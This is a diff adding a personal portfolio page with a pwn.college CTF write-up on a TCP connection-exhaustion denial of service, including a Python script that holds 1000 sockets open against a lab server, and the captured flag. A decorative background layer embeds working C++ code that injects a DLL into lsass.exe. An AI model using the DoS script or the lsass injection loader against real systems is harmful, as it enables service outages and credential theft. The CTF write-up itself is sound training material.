@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📌 Challenge Summary</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="📌 Challenge Summary" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>📌 Challenge Summary</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Level:</strong> <code class="language-plaintext highlighter-rouge">dos1</code><br />
+<strong>Category:</strong> Intercepting Communication → Denial of Service<br />
+<strong>Goal:</strong> Prevent the client at <code class="language-plaintext highlighter-rouge">10.0.0.3</code> from successfully connecting to the server at <code class="language-plaintext highlighter-rouge">10.0.0.2</code> on <strong>port 31337</strong>, thereby <strong>denying the service</strong>.</p>
+
+<hr />
+
+<h1 id="-understanding-the-setup">🧠 Understanding the Setup</h1>
+
+<ul>
+  <li>A <code class="language-plaintext highlighter-rouge">ServerHost</code> listens on <code class="language-plaintext highlighter-rouge">0.0.0.0:31337</code> and accepts connections.</li>
+  <li>A <code class="language-plaintext highlighter-rouge">ClientHost</code> continuously tries to connect to <code class="language-plaintext highlighter-rouge">10.0.0.2:31337</code> every second and sends <code class="language-plaintext highlighter-rouge">"Hello, World!\n"</code>.</li>
+  <li>If the client fails to connect (times out), it prints the flag and exits.</li>
+  <li>Our host (<code class="language-plaintext highlighter-rouge">10.0.0.1</code>) is the attacker.</li>
+</ul>
+
+<hr />
+
+<h1 id="-how-we-exploit-it">🔍 How We Exploit It</h1>
+
+<p>We want the client to <strong>fail to connect</strong> to the server. We can achieve this by:</p>
+
+<ul>
+  <li><strong>Holding connections open</strong> to the server from our own host.</li>
+  <li>This consumes the server’s <strong>limited backlog</strong> (the queue of pending connections).</li>
+  <li>As a result, the client’s connection attempt will <strong>timeout or get refused</strong>.</li>
+</ul>
+
+<p>This is known as a <strong>TCP connection exhaustion</strong> DoS attack.</p>
+
+<hr />
+
+<h1 id="-attack-plan">🧪 Attack Plan</h1>
+
+<ol>
+  <li>Create many TCP sockets in our attacker code.</li>
+  <li>Connect them to <code class="language-plaintext highlighter-rouge">10.0.0.2:31337</code>.</li>
+  <li>Keep the connections open without sending or receiving any data.</li>
+  <li>This prevents the server from accepting new connections, including the client’s.</li>
+</ol>
+
+<hr />
+
+<h1 id="-final-exploit">💣 Final Exploit</h1>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># working/connect.py
+</span><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="n">sockets</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>  <span class="c1"># Enough to exhaust server socket queue
+</span>    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
+        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.0.0.2</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">))</span>  <span class="c1"># Target the server
+</span>        <span class="n">sockets</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>  <span class="c1"># Slow ramp-up to avoid local crash
+</span>    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed:</span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+        <span class="k">break</span>
+
+<span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Connections held open. Press Enter to close them.</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sockets</span><span class="p">:</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="output">Output</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{wYBitxJdMcZM-4lyAm3dUQtc6Hc.01N1AjNxwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{wYBitxJdMcZM-4lyAm3dUQtc6Hc.01N1AjNxwSM0IzMyEzW}
+</code></pre></div></div>
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
